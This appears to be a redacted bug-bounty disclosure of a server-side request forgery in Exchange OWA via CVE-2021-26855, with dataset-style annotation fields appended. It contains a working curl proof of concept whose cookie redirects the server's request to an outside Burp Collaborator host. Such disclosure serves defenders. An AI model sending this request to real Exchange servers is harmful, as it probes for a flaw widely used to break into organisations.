title: SSRF due to CVE-2021-26855 on ████████
content:
Description:
There exists a Server Side Request Frogery (SSRF) on █████████ due to CVE-2021-26855
References
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26855
Impact
Server Side Request Frogery
System Host(s)
██████
Affected Product(s) and Version(s)
CVE Numbers
CVE-2021-26855
Steps to Reproduce
Code 547 Bytes
1curl -i -s -k -X $'GET' \
2    -H $'Host: ████' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
3    -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' \
4    $'https://███/owa/auth/x.js'
Output:
█████████
Suggested Mitigation/Remediation Actions
steps: Use curl to send a GET request to the target OWA endpoint with specific headers and cookies designed to trigger the SSRF vulnerability.
Observe the response from the server to confirm the SSRF vulnerability.
vuln_description: There exists a Server Side Request Forgery (SSRF) vulnerability due to CVE-2021-26855, which allows an attacker to make arbitrary requests from the vulnerable server.
reason: The attack involves a single, well-documented CVE with clear reproduction steps. The complexity is low as it does not require multiple components or subtle interactions.
